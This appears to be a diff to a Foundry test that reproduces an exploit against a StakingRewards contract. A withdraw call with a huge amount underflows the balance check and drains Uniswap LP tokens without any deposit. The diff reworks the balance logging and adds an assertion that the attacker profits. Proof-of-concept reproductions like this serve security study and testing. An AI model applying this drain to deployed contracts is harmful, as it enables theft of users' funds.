@@ -26,7 +26,7 @@ contract AttackContract is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)),18);
+        uint256 balance_before = uniLP.balanceOf(address(this));
 
         StakingRewards.withdraw(8792873290680252648282);  //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.
         
@@ -39,7 +39,9 @@ contract AttackContract is Test {
         _totalSupply = _totalSupply - amount;
         _balances[user] = _balances[user] - amount;   //<---- underflow here.
         */
-        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)),18);
-
+        uint256 balance_after = uniLP.balanceOf(address(this));
+        assert(balance_after > balance_before);
+        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", balance_before, 18);
+        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", balance_after, 18);
     }
 }
